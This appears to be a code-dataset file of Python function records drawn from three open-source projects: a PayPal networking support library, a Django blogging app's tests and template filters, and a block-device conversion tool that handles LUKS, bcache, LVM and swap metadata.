{"docstring": "'''\nGathers and correlates fd info from 3 sources:\n\n1. gc over all objects that have a fileno(); this is most 'socket-like' things\n2. infra Context object data structures\n3. psutil information\n4. /proc filesystem (if available)\n\nThis function is a little bit open-ended, we can probably continue\nto find additional sources of information\n'''\n", "func_signal": "def get_fd_info():\n", "code": "import psutil\n\nfd_info = collections.defaultdict(\n    lambda: {'gc_objs': [], '/proc': {}, 'context': [], 'psutil': {}})\n\n# 1 - all objects with filenos\nfor obj in gc.get_objects():\n    try:\n        fd = None\n        if hasattr(obj, 'fileno') and callable(obj.fileno):\n            fd = obj.fileno()\n    except:  # there are a zillion boring reasons this may fail\n        pass\n    if isinstance(fd, (int, long)):\n        fd_info[fd]['gc_objs'].append(obj)\n\n# 2 - inspection of data-structures in context\nctx = context.get_context()\nsocks = []\nif ctx.connection_mgr:\n    for model in ctx.connection_mgr.server_models.values():\n        socks.extend(model.active_connections)\nif ctx.client_sockets:\n    socks.extend(ctx.client_sockets)\nif ctx.server_group:\n    socks.extend(ctx.server_group.socks.values())\nfor sock in socks:\n    fd_info[sock.fileno()]['context'].append(sock)\n\n# 3 - psutil information\nprocess = psutil.Process()\nfor f in process.get_open_files():\n    if f.fd == -1:\n        continue\n    fd_info[f.fd]['psutil']['path'] = f.path\nfor conn in process.get_connections(kind='all'):\n    if conn.fd == -1:\n        continue\n    fd_info[conn.fd]['psutil'].update(vars(conn))\n    del fd_info[conn.fd]['psutil']['fd']\n\n# 4 - /proc filesystem\nproc_path = \"/proc/\" + str(os.getpid())\nif not os.path.exists(proc_path):\n    return dict(fd_info)\n\nfor fd in os.listdir(proc_path + \"/fd\"):\n    try:\n        inode = os.readlink(proc_path + \"/fd/\" + fd)\n    except OSError:\n        continue\n    else:\n        fd = int(fd)\n        fd_info[fd]['/proc']['inode'] = inode\n\nreturn dict(fd_info)", "path": "support\\meta_service\\meta_service.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "# invoked via BaseServer._do_read.  Whereas\n# StreamServer.do_read calls self.socket.accept, we just\n# need to pop off our queue\n", "func_signal": "def do_read(self):\n", "code": "if not self._watcher:\n    return\nif not self._watcher.queue:\n    raise RuntimeError('QUEUE DISAPPEARED')\nclient_socket, address, exc, pushed_at = self._watcher.queue.pop()\n\nage = nanotime() - pushed_at\ncontext.get_context().stats[CONN_AGE_STATS].add(age / 1e6)\n\nif exc is not None:\n    # raise the Exception\n    raise exc\n\nreturn gevent.socket.socket(_sock=client_socket), address", "path": "support\\group.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "'''\nreduce to the specified size by killing the oldest sockets\nreturns a greenlet that can be joined on to wait for all sockets to close\n'''\n", "func_signal": "def reduce_size(self, size):\n", "code": "if self.total_sockets <= size:\n    return\nnum_culling = self.total_sockets - size\nculled = sorted([(v, k) for k,v in self.sock_idle_times.iteritems()])[-num_culling:]\nself.total_sockets -= num_culling\nreturn [self._remove_sock(e[1]) for e in culled]", "path": "support\\socket_pool.py", "repo_name": "paypal/support", "stars": 261, "license": "other", "language": "python", "size": 2205}
{"docstring": "# Create a test user\n", "func_signal": "def setUp(self):\n", "code": "self.user_data = {\n    'username': 'test',\n    'password': 'testpassword123',\n}\nself.user = User.create_user(*self.user_data.values())\n\n# Create a test entry\nself.text_entry = TextEntry(title='Test-Entry', slug='test-entry')\nself.text_entry.tags = ['tests']\nself.text_entry.published = True\nself.text_entry.content = 'some-test-content'\nself.text_entry.rendered_content = '<p>some test content</p>'\n\n# Create test comment\nself.comment = HtmlComment(\n    author='Mr Test',\n    body='test comment',\n    rendered_content = '<p>test comment</p>',\n)\nself.text_entry.comments = [self.comment]\n\nself.text_entry.save()", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that entries may be deleted.\n\"\"\"\n", "func_signal": "def test_delete_entry(self):\n", "code": "delete_url = '/admin/delete/'\ndata = {\n    'entry_id': self.text_entry.id,\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n}\nresponse = self.client.post(delete_url, data) \nself.assertRedirects(response, '/admin/login/?next=' + delete_url,\n                     target_status_code=200)\n\nself.login()\n\ndata['csrfmiddlewaretoken'] = self.get_csrf_token()\nresponse = self.client.post(delete_url, data) \nself.assertRedirects(response, '/')\n\nresponse = self.client.get('/')\nself.assertNotContains(response, self.text_entry.rendered_content, \n                       status_code=200)", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that comments can be deleted\n\"\"\"\n", "func_signal": "def test_delete_comment(self):\n", "code": "self.login()\n\ndata = {\n    'comment_id': self.text_entry.comments[0].id,\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n}\ndelete_url = '/admin/delete-comment/'\n\nresponse = self.client.post(delete_url, data)\nredirect_url = self.text_entry.get_absolute_url() + '#comments'\nself.assertRedirects(response, redirect_url)\n\nself.text_entry.reload()\nself.assertEqual(len(self.text_entry.comments), 0)", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that the 'tagged entries' page works properly.\n\"\"\"\n", "func_signal": "def test_tagged_entries(self):\n", "code": "response = self.client.get('/tag/tests/')\nself.assertContains(response, self.text_entry.rendered_content, \n                    status_code=200)\n\nresponse = self.client.get('/tag/programming/')\nself.assertNotContains(response, self.text_entry.rendered_content, \n                       status_code=200)", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that users may log in and out.\n\"\"\"\n# User not logged in\n", "func_signal": "def test_login_logout(self):\n", "code": "response = self.client.get('/admin/login/')\nself.assertFalse(isinstance(response.context['user'], User))\n\n# User logging in\ndata = self.user_data.copy()\ndata['csrfmiddlewaretoken'] = self.get_csrf_token()\nresponse = self.client.post('/admin/login/', data)\nself.assertRedirects(response, settings.LOGIN_REDIRECT_URL, \n                     target_status_code=200)\n\n# User logged in\nresponse = self.client.get('/')\nself.assertTrue(isinstance(response.context['user'], User))\n\nresponse = self.client.get('/admin/logout/')\nself.assertRedirects(response, '/', target_status_code=200)\n\n# User logged out\nresponse = self.client.get('/admin/login/')\nself.assertFalse(isinstance(response.context['user'], User))", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that the 'tag cloud' page works properly.\n\"\"\"\n", "func_signal": "def test_tag_cloud(self):\n", "code": "response = self.client.get('/tags/')\nself.assertContains(response, 'tests', status_code=200)", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"\nTest a calculation is False, also checking the inverse \"negate\" case.\n\"\"\"\n", "func_signal": "def assertCalcFalse(self, calc, context=None):\n", "code": "context = context or {}\nself.assertFalse(calc.resolve(context))\ncalc.negate = not calc.negate\nself.assert_(calc.resolve(context))", "path": "mumblr\\templatetags\\smart_if.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that entries may be edited.\n\"\"\"\n", "func_signal": "def test_edit_entry(self):\n", "code": "self.login()\nedit_url = '/admin/edit/%s/' % self.text_entry.id\n\nentry_data = {\n    'title': self.text_entry.title,\n    'slug': self.text_entry.slug,\n    'published': 'true',\n    'publish_date_year': datetime.now().year,\n    'publish_date_month': datetime.now().month,\n    'publish_date_day': datetime.now().day,\n    'publish_time': datetime.now().strftime('%H:%M:%S'),\n    'content': 'modified-test-content',\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n}\n# Check invalid form fails\nresponse = self.client.post(edit_url, {\n    'content': 'test',\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n})\nself.assertTemplateUsed(response, 'mumblr/admin/add_entry.html')\n\n# Check editing an entry does work\nresponse = self.client.post(edit_url, entry_data)\nentry = TextEntry(slug=entry_data['slug'], publish_time=datetime.now())\nurl = entry.get_absolute_url()\nself.assertRedirects(response, url, target_status_code=200)\n\nresponse = self.client.get('/')\nself.assertContains(response, entry_data['content'])", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that entries may be added.\n\"\"\"\n", "func_signal": "def test_add_entry(self):\n", "code": "self.login()\nresponse = self.client.get('/admin/add/text/')\n\nentry_data = {\n    'title': 'Second test entry',\n    'slug': 'second-test-entry',\n    'tags': 'tests',\n    'published': 'true',\n    'content': 'test',\n    'publish_date_year': datetime.now().year,\n    'publish_date_month': datetime.now().month,\n    'publish_date_day': datetime.now().day,\n    'publish_time': datetime.now().strftime('%H:%M:%S'),\n    'rendered_content': '<p>test</p>',\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n}\n# Check invalid form fails\nresponse = self.client.post('/admin/add/text/', {\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n    'content': 'test',\n})\nself.assertTemplateUsed(response, 'mumblr/admin/add_entry.html')\n\n# Check adding an entry does work\nresponse = self.client.post('/admin/add/text/', entry_data)\nentry = TextEntry(slug=entry_data['slug'], publish_time=datetime.now())\nurl = entry.get_absolute_url()\nself.assertRedirects(response, url, target_status_code=200)\n\nresponse = self.client.get('/')\nself.assertContains(response, entry_data['content'])", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that a login is required for restricted pages.\n\"\"\"\n", "func_signal": "def test_login_requred(self):\n", "code": "restricted_pages = ['/admin/', '/admin/add/text/'] \nrestricted_pages.append('/admin/edit/%s/' % self.text_entry.id)\nrestricted_pages.append('/admin/delete/')\n\n# Check in turn that each of the restricted pages may not be accessed\nfor url in restricted_pages:\n    response = self.client.get(url)\n    self.assertRedirects(response, '/admin/login/?next=' + url,\n                         target_status_code=200)\n\nself.login()\n# Check in turn that each of the restricted pages may be accessed\nfor url in restricted_pages:\n    response = self.client.get(url, follow=True)\n    self.assertFalse('/admin/login' in response.get('location', ''))", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Replaces the space between the last two words in a string with ``&nbsp;``\nWorks in these block tags ``(h1-h6, p, li, dd, dt)`` and also accounts for \npotential closing inline elements ``a, em, strong, span, b, i``\n\n>>> widont('A very simple test')\nu'A very simple&nbsp;test'\n\nSingle word items shouldn't be changed\n>>> widont('Test')\nu'Test'\n>>> widont(' Test')\nu' Test'\n>>> widont('<ul><li>Test</p></li><ul>')\nu'<ul><li>Test</p></li><ul>'\n>>> widont('<ul><li> Test</p></li><ul>')\nu'<ul><li> Test</p></li><ul>'\n\n>>> widont('<p>In a couple of paragraphs</p><p>paragraph two</p>')\nu'<p>In a couple of&nbsp;paragraphs</p><p>paragraph&nbsp;two</p>'\n\n>>> widont('<h1><a href=\"#\">In a link inside a heading</i> </a></h1>')\nu'<h1><a href=\"#\">In a link inside a&nbsp;heading</i> </a></h1>'\n\n>>> widont('<h1><a href=\"#\">In a link</a> followed by other text</h1>')\nu'<h1><a href=\"#\">In a link</a> followed by other&nbsp;text</h1>'\n\nEmpty HTMLs shouldn't error\n>>> widont('<h1><a href=\"#\"></a></h1>') \nu'<h1><a href=\"#\"></a></h1>'\n\n>>> widont('<div>Divs get no love!</div>')\nu'<div>Divs get no love!</div>'\n\n>>> widont('<pre>Neither do PREs</pre>')\nu'<pre>Neither do PREs</pre>'\n\n>>> widont('<div><p>But divs with paragraphs do!</p></div>')\nu'<div><p>But divs with paragraphs&nbsp;do!</p></div>'\n\"\"\"\n", "func_signal": "def widont(text):\n", "code": "text = force_unicode(text)\nwidont_finder = re.compile(r\"\"\"((?:</?(?:a|em|span|strong|i|b)[^>]*>)|[^<>\\s]) # must be proceeded by an approved inline opening or closing tag or a nontag/nonspace\n                               \\s+                                             # the space to replace\n                               ([^<>\\s]+                                       # must be flollowed by non-tag non-space characters\n                               \\s*                                             # optional white space! \n                               (</(a|em|span|strong|i|b)>\\s*)*                 # optional closing inline tags with optional white space after each\n                               ((</(p|h[1-6]|li|dt|dd)>)|$))                   # end with a closing p, h1-6, li or the end of the string\n                               \"\"\", re.VERBOSE)\noutput = widont_finder.sub(r'\\1&nbsp;\\2', text)\nreturn mark_safe(output)", "path": "mumblr\\templatetags\\typogrify.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Run the unit tests without using the ORM.\n\"\"\"\n", "func_signal": "def run_tests(test_labels, verbosity=1, interactive=True, extra_tests=[]):\n", "code": "setup_test_environment()\n\nsettings.DEBUG = False\nsettings.DATABASE_SUPPORTS_TRANSACTIONS = False\nsuite = unittest.TestSuite()\n\nif test_labels:\n    for label in test_labels:\n        if '.' in label:\n            suite.addTest(build_test(label))\n        else:\n            app = get_app(label)\n            suite.addTest(build_suite(app))\nelse:\n    for app in get_apps():\n        suite.addTest(build_suite(app))\n\nfor test in extra_tests:\n    suite.addTest(test)\n\nsuite = reorder_suite(suite, (TestCase,))\n\nrunner = unittest.TextTestRunner(verbosity=verbosity)\nresult = runner.run(suite)\n\nteardown_test_environment()\n\nreturn len(result.failures) + len(result.errors)", "path": "example\\testrunner.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that comments can be added\n\"\"\"\n# Login to prevent Captcha\n", "func_signal": "def test_add_comment(self):\n", "code": "self.login()\nadd_url = self.text_entry.get_absolute_url()+'#comments'\n\ncomment_data = {\n    'author': 'Mr Test 2',\n    'body': 'another-test-comment',\n    'rendered_content': '<p>another-test-comment</p>',\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n}\n\n# Check invalid form fails\nresponse = self.client.post(add_url, {\n    'body': 'test',\n    'csrfmiddlewaretoken': self.get_csrf_token(),\n})\n\n# Check adding comment works\nresponse = self.client.post(add_url, comment_data)\nself.assertRedirects(response, add_url, target_status_code=200)\n\nresponse = self.client.get(add_url)\nself.assertContains(response, comment_data['rendered_content'])", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"\nA smarter {% if %} tag for django templates.\n\nWhile retaining current Django functionality, it also handles equality,\ngreater than and less than operators. Some common case examples::\n\n    {% if articles|length >= 5 %}...{% endif %}\n    {% if \"ifnotequal tag\" != \"beautiful\" %}...{% endif %}\n\nArguments and operators _must_ have a space between them, so\n``{% if 1>2 %}`` is not a valid smart if tag.\n\nAll supported operators are: ``or``, ``and``, ``in``, ``=`` (or ``==``),\n``!=``, ``>``, ``>=``, ``<`` and ``<=``.\n\"\"\"\n", "func_signal": "def smart_if(parser, token):\n", "code": "bits = token.split_contents()[1:]\nvar = TemplateIfParser(parser, bits).parse()\nnodelist_true = parser.parse(('else', 'endif'))\ntoken = parser.next_token()\nif token.contents == 'else':\n    nodelist_false = parser.parse(('endif',))\n    parser.delete_first_token()\nelse:\n    nodelist_false = None\nreturn SmartIfNode(var, nodelist_true, nodelist_false)", "path": "mumblr\\templatetags\\smart_if.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"\nTest a calculation is True, also checking the inverse \"negate\" case.\n\"\"\"\n", "func_signal": "def assertCalc(self, calc, context=None):\n", "code": "context = context or {}\nself.assert_(calc.resolve(context))\ncalc.negate = not calc.negate\nself.assertFalse(calc.resolve(context))", "path": "mumblr\\templatetags\\smart_if.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that the entry detail page works properly.\n\"\"\"\n", "func_signal": "def test_entry_detail(self):\n", "code": "response = self.client.get(self.text_entry.get_absolute_url())\nself.assertContains(response, self.text_entry.rendered_content, \n                    status_code=200)", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Convert expiry options to actual dates and add publish time\nto publish date\n\"\"\"\n", "func_signal": "def clean(self):\n", "code": "data = self.cleaned_data\n\nif not self._errors:\n    tags = data['tags']\n    tags = tags.lower()\n    if ',' in tags:\n        tags = [tag.strip() for tag in tags.split(',')]\n    else:\n        tags = [tag.strip() for tag in tags.split()]\n    data['tags'] = tags\n\n    # We're using publish_time to get the time from the user - in\n    # the DB its actually just part of publish_date, so update\n    # publish_date to include publish_time's info\n    publish_time = data['publish_time']\n    expiry_time = data['expiry_time']\n    if publish_time and data['publish_date']:\n        data['publish_date'] = data['publish_date'].replace(\n            hour=publish_time.hour,\n            minute=publish_time.minute,\n            second=publish_time.second)\n    if expiry_time and data['expiry_date']:\n        data['expiry_date'] = data['expiry_date'].replace(\n            hour=expiry_time.hour,\n            minute=expiry_time.minute,\n            second=expiry_time.second)\n\n    # The comments expiry date is selected and stored as a relative\n    # time from the publish_date but it is useful to have an actual\n    # expiry date too, so we work it out here\n    comments_expiry = data['comments_expiry']\n    publish_date = data['publish_date']\n    if comments_expiry:\n        data['comments_expiry_date'] = {\n            # With no simple way of adding an exact month,\n            # approximate day representations are used\n            'never': lambda now: None,\n            'week': lambda now: now + timedelta(7),\n            'month': lambda now: now + timedelta(30),\n            'half_year': lambda now: now + timedelta(182),\n        }[comments_expiry](publish_date)\n    else:\n        data['comments_expiry_date'] = None\n\nreturn data", "path": "mumblr\\entrytypes\\__init__.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "# Scrape CSRF token\n", "func_signal": "def get_csrf_token(self):\n", "code": "response = self.client.get('/admin/login/')\ncsrf_regex = r'csrfmiddlewaretoken\\'\\s+value=\\'(\\w+)\\''\ncsrf_regex = r'value=\\'(\\w+)\\''\nreturn re.search(csrf_regex, response.content).groups()[0]", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Ensure that the recent entries page works properly.\n\"\"\"\n", "func_signal": "def test_recent_entries(self):\n", "code": "response = self.client.get('/')\nself.assertContains(response, self.text_entry.rendered_content, \n                    status_code=200)", "path": "mumblr\\tests.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "\"\"\"Wraps initial quotes in ``class=\"dquo\"`` for double quotes or  \n``class=\"quo\"`` for single quotes. Works in these block tags ``(h1-h6, p, li, dt, dd)``\nand also accounts for potential opening inline elements ``a, em, strong, span, b, i``\n\n>>> initial_quotes('\"With primes\"')\nu'<span class=\"dquo\">\"</span>With primes\"'\n>>> initial_quotes(\"'With single primes'\")\nu'<span class=\"quo\">\\\\'</span>With single primes\\\\''\n\n>>> initial_quotes('<a href=\"#\">\"With primes and a link\"</a>')\nu'<a href=\"#\"><span class=\"dquo\">\"</span>With primes and a link\"</a>'\n\n>>> initial_quotes('&#8220;With smartypanted quotes&#8221;')\nu'<span class=\"dquo\">&#8220;</span>With smartypanted quotes&#8221;'\n\"\"\"\n", "func_signal": "def initial_quotes(text):\n", "code": "text = force_unicode(text)\nquote_finder = re.compile(r\"\"\"((<(p|h[1-6]|li|dt|dd)[^>]*>|^)              # start with an opening p, h1-6, li, dd, dt or the start of the string\n                              \\s*                                          # optional white space! \n                              (<(a|em|span|strong|i|b)[^>]*>\\s*)*)         # optional opening inline tags, with more optional white space for each.\n                              ((\"|&ldquo;|&\\#8220;)|('|&lsquo;|&\\#8216;))  # Find me a quote! (only need to find the left quotes and the primes)\n                                                                           # double quotes are in group 7, singles in group 8 \n                              \"\"\", re.VERBOSE)\ndef _quote_wrapper(matchobj):\n    if matchobj.group(7): \n        classname = \"dquo\"\n        quote = matchobj.group(7)\n    else:\n        classname = \"quo\"\n        quote = matchobj.group(8)\n    return \"\"\"%s<span class=\"%s\">%s</span>\"\"\" % (matchobj.group(1), classname, quote) \noutput = quote_finder.sub(_quote_wrapper, text)\nreturn mark_safe(output)", "path": "mumblr\\templatetags\\typogrify.py", "repo_name": "hmarr/django-mumblr", "stars": 257, "license": "mit", "language": "python", "size": 468}
{"docstring": "# TODO: also detect an MBR other than protective,\n# and refuse to edit that.\n", "func_signal": "def ptable_type(self):\n", "code": "rv = subprocess.check_output(\n    'blkid -p -o value -s PTTYPE --'.split() + [self.devpath]\n).rstrip().decode('ascii')\nif rv:\n    return rv", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# cs.activate\n", "func_signal": "def activate(self, dmname):\n", "code": "subprocess.check_call(\n    ['cryptsetup', 'luksOpen', '--', self.device.devpath, dmname])", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# read the cyphertext's luks superblock\n#self.offset = cs.info()['offset']  # pycryptsetup\n", "func_signal": "def read_superblock(self):\n", "code": "self.offset = None\n\nproc = subprocess.Popen(\n    ['cryptsetup', 'luksDump', '--', self.device.devpath],\n    stdout=subprocess.PIPE)\nfor line in proc.stdout:\n    if line.startswith(b'Payload offset:'):\n        line = line.decode('ascii')\n        self.offset = int(aftersep(line, ':')) * 512\nproc.wait()\nassert proc.returncode == 0\nself._superblock_read = True", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# Loop on partitions overlapping with the range, excluding free space\n\n# Careful: end_sector is exclusive here,\n# but parted geometry uses inclusive ends.\n\n", "func_signal": "def _iter_range(self, start_sector, end_sector):\n", "code": "import _ped\nwhile start_sector < end_sector:\n    part = self.parted_disk.getPartitionBySector(start_sector)\n    if not (part.type & _ped.PARTITION_FREESPACE):\n        yield part\n    # inclusive, so add one\n    start_sector = part.geometry.end + 1", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# Low-level\n# https://cryptsetup.googlecode.com/git/docs/on-disk-format.pdf\n\n", "func_signal": "def read_superblock_ll(self, fd):\n", "code": "self.sb_end = None\nmagic, version = struct.unpack('>6sH', os.pread(fd, 8, 0))\nassert magic == b'LUKS\\xBA\\xBE', magic\nassert version == 1\n\npayload_start_sectors, key_bytes = struct.unpack(\n    '>2I', os.pread(fd, 8, 104))\nsb_end = 592\n\nfor key_slot in range(8):\n    key_offset, key_stripes = struct.unpack(\n        '>2I', os.pread(fd, 8, 208 + 48 * key_slot + 40))\n    assert key_stripes == 4000\n    key_size = key_stripes * key_bytes\n    key_end = key_offset * 512 + key_size\n    if key_end > sb_end:\n        sb_end = key_end\n\nll_offset = payload_start_sectors * 512\nassert ll_offset == self.offset, (ll_offset, self.offset)\nassert ll_offset >= sb_end\nself.sb_end = sb_end", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# universal_newlines is used to enable io decoding in the current locale\n", "func_signal": "def quiet_call(cmd, *args, **kwargs):\n", "code": "proc = subprocess.Popen(\n    cmd, *args, universal_newlines=True, stdin=subprocess.DEVNULL,\n    stdout=subprocess.PIPE, stderr=subprocess.PIPE, **kwargs)\nodat, edat = proc.communicate()\nif proc.returncode != 0:\n    print(\n        'Command {!r} has failed with status {}\\n'\n        'Standard output:\\n{}\\n'\n        'Standard error:\\n{}'.format(\n            cmd, proc.returncode, odat, edat), file=sys.stderr)\n    raise subprocess.CalledProcessError(proc.returncode, cmd, odat)", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# blkid doesn't detect bcache, so special-case it.\n# To keep dependencies light, don't use bcache-tools for detection,\n# only require the tools after a successful detection.\n", "func_signal": "def has_bcache_superblock(self):\n", "code": "if self.size <= 8192:\n    return False\nsbfd = os.open(self.devpath, os.O_RDONLY)\nmagic, = struct.unpack('16s', os.pread(sbfd, 16, 4096 + 24))\nos.close(sbfd)\nreturn magic == BCACHE_MAGIC", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "\"\"\"Rotate a logical volume by a single PE.\n\nIf forward:\n    Move the first physical extent of an LV to the end\nelse:\n    Move the last physical extent of a LV to the start\n\nthen poke LVM to refresh the mapping.\n\"\"\"\n\n", "func_signal": "def rotate_lv(*, device, size, debug, forward):\n", "code": "import augeas\nclass Augeas(augeas.Augeas):\n    def get_int(self, key):\n        return int(self.get(key + '/int'))\n\n    def set_int(self, key, val):\n        return self.set(key + '/int', '%d' % val)\n\n    def incr(self, key, by=1):\n        orig = self.get_int(key)\n        self.set_int(key, orig + by)\n\n    def decr(self, key):\n        self.incr(key, by=-1)\n\nlv_info = subprocess.check_output(\n    'lvm lvs --noheadings --rows --units=b --nosuffix '\n    '-o vg_name,vg_uuid,lv_name,lv_uuid,lv_attr --'.split()\n    + [device.devpath], universal_newlines=True).splitlines()\nvgname, vg_uuid, lvname, lv_uuid, lv_attr = (fi.lstrip() for fi in lv_info)\nactive = lv_attr[4] == 'a'\n\n# Make sure the volume isn't in use by unmapping it\nquiet_call(\n    ['lvm', 'lvchange', '-an', '--', '{}/{}'.format(vgname, lvname)])\n\nwith tempfile.TemporaryDirectory(suffix='.blocks') as tdname:\n    vgcfgname = tdname + '/vg.cfg'\n    print('Loading LVM metadata... ', end='', flush=True)\n    quiet_call(\n        ['lvm', 'vgcfgbackup', '--file', vgcfgname, '--', vgname])\n    aug = Augeas(\n        loadpath=pkg_resources.resource_filename('blocks', 'augeas'),\n        root='/dev/null',\n        flags=augeas.Augeas.NO_MODL_AUTOLOAD | augeas.Augeas.SAVE_NEWFILE)\n    vgcfg = open(vgcfgname)\n    vgcfg_orig = vgcfg.read()\n    aug.set('/raw/vgcfg', vgcfg_orig)\n\n    aug.text_store('LVM.lns', '/raw/vgcfg', '/vg')\n    print('ok')\n\n    # There is no easy way to quote for XPath, so whitelist\n    assert all(ch in ASCII_ALNUM_WHITELIST for ch in vgname), vgname\n    assert all(ch in ASCII_ALNUM_WHITELIST for ch in lvname), lvname\n\n    aug.defvar('vg', '/vg/{}/dict'.format(vgname))\n    assert aug.get('$vg/id/str') == vg_uuid\n    aug.defvar('lv', '$vg/logical_volumes/dict/{}/dict'.format(lvname))\n    assert aug.get('$lv/id/str') == lv_uuid\n\n    rotate_aug(aug, forward, size)\n    aug.text_retrieve('LVM.lns', '/raw/vgcfg', '/vg', '/raw/vgcfg.new')\n    open(vgcfgname + '.new', 'w').write(aug.get('/raw/vgcfg.new'))\n    rotate_aug(aug, not forward, size)\n    aug.text_retrieve('LVM.lns', '/raw/vgcfg', '/vg', '/raw/vgcfg.backagain')\n    open(vgcfgname + '.backagain', 'w').write(aug.get('/raw/vgcfg.backagain'))\n\n    if debug:\n        print('CHECK STABILITY')\n        subprocess.call(\n            ['git', '--no-pager', 'diff', '--no-index', '--patience', '--color-words',\n             '--', vgcfgname, vgcfgname + '.backagain'])\n        if forward:\n            print('CHECK CORRECTNESS (forward)')\n        else:\n            print('CHECK CORRECTNESS (backward)')\n        subprocess.call(\n            ['git', '--no-pager', 'diff', '--no-index', '--patience', '--color-words',\n             '--', vgcfgname, vgcfgname + '.new'])\n\n    if forward:\n        print(\n            'Rotating the second extent to be the first... ',\n            end='', flush=True)\n    else:\n        print(\n            'Rotating the last extent to be the first... ',\n            end='', flush=True)\n    quiet_call(\n        ['lvm', 'vgcfgrestore', '--file', vgcfgname + '.new', '--', vgname])\n    # Make sure LVM updates the mapping, this is pretty critical\n    quiet_call(\n        ['lvm', 'lvchange', '--refresh', '--', '{}/{}'.format(vgname, lvname)])\n    if active:\n        quiet_call(\n            ['lvm', 'lvchange', '-ay', '--', '{}/{}'.format(vgname, lvname)])\n    print('ok')", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# using mkswap+swaplabel like GParted would drop some metadata\n", "func_signal": "def _resize(self, target_size):\n", "code": "if self.big_endian:\n    fmt = '>II'\nelse:\n    fmt = '<II'\nwith self.device.open_excl_ctx() as dev_fd:\n    os.pwrite(dev_fd, struct.pack(\n        fmt, self.version, target_size // self.block_size - 1), 1024)", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
{"docstring": "# If the device is already activated we won't have\n# to prompt for a passphrase.\n", "func_signal": "def cleartext_device(self):\n", "code": "dev = self.snoop_activated()\nif dev is None:\n    dmname = 'cleartext-{}'.format(uuid.uuid1())\n    self.activate(dmname)\n    dev = BlockDevice('/dev/mapper/' + dmname)\nreturn dev", "path": "blocks\\__main__.py", "repo_name": "g2p/blocks", "stars": 360, "license": "gpl-3.0", "language": "python", "size": 3792}
